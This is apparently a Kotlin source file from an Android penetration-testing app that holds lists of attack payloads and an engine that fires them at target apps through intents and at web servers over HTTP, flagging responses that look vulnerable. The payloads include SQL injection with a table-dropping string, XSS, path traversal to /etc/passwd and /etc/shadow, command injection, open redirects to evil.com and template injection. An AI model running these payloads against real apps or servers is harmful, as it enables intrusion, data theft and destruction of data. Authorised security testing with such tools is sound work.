package com.androhunter.app.ui.payload

import android.content.Context
import android.content.Intent
import android.net.Uri
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

enum class PayloadType(val label: String, val payloads: List<String>) {
    SQL_INJECTION("SQL Injection", listOf("'", "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
        "1 UNION SELECT null,null--", "' AND SLEEP(5)--", "admin'--", "\" OR \"\"=\"")),
    XSS("XSS", listOf("<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)", "'><svg onload=alert(1)>", "${7*7}", "{{7*7}}")),
    LFI("LFI / Path Traversal", listOf("../../../etc/passwd", "../../../../etc/shadow",
        "..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd", "/etc/passwd%00")),
    OPEN_REDIRECT("Open Redirect", listOf("https://evil.com", "//evil.com",
        "javascript:alert(1)", "https://evil.com%2F@target.com",
        "/\\/evil.com", "/%09/evil.com")),
    TEMPLATE_INJECTION("Template Injection", listOf("{{7*7}}", "\${7*7}", "#{7*7}",
        "<%= 7*7 %>", "{{config}}", "{{self._dict_}}")),
    COMMAND_INJECTION("Command Injection", listOf("; id", "| id", "` id`", "\$(id)",
        "; cat /etc/passwd", "| cat /etc/passwd", "&& id", "|| id")),
    IDOR("IDOR", listOf("0", "1", "2", "100", "9999", "-1", "null", "undefined",
        "00000000-0000-0000-0000-000000000001")),
}

class PayloadEngine(private val context: Context) {

    suspend fun fireIntentPayload(
        packageName: String,
        className: String,
        extraKey: String,
        payload: String,
        dataUri: String?
    ): PayloadResult = withContext(Dispatchers.IO) {
        return@withContext try {
            val intent = Intent().apply {
                component = android.content.ComponentName(packageName, className)
                putExtra(extraKey, payload)
                putExtra("data", payload)
                putExtra("url", payload)
                putExtra("path", payload)
                putExtra("redirect", payload)
                if (!dataUri.isNullOrBlank()) {
                    data = Uri.parse(dataUri.replace("PAYLOAD", Uri.encode(payload)))
                }
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            delay(500)
            PayloadResult(payload, "intent", ResultStatus.SAFE, "Intent gönderildi")
        } catch (e: Exception) {
            PayloadResult(payload, "intent", ResultStatus.ERROR, e.message ?: "Hata")
        }
    }

    suspend fun fireHttpPayload(
        baseUrl: String,
        payload: String,
        type: PayloadType
    ): PayloadResult = withContext(Dispatchers.IO) {
        val encoded   = java.net.URLEncoder.encode(payload, "UTF-8")
        val targetUrl = "$baseUrl$encoded"
        return@withContext try {
            val conn = URL(targetUrl).openConnection() as HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout    = 5000
            val code   = conn.responseCode
            val body   = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val vuln = when (type) {
                PayloadType.SQL_INJECTION     -> body.contains("sql", true) || body.contains("syntax", true) || body.contains("mysql", true)
                PayloadType.XSS              -> body.contains(payload)
                PayloadType.LFI              -> body.contains("root:x:0:0") || body.contains("/bin/bash")
                PayloadType.TEMPLATE_INJECTION -> body.contains("49")  // 7*7=49
                else -> false
            }
            PayloadResult(payload, type.label, if (vuln) ResultStatus.VULNERABLE else ResultStatus.SAFE,
                "HTTP $code — ${body.take(100)}")
        } catch (e: Exception) {
            PayloadResult(payload, type.label, ResultStatus.ERROR, e.message ?: "Bağlantı hatası")
        }
    }
}
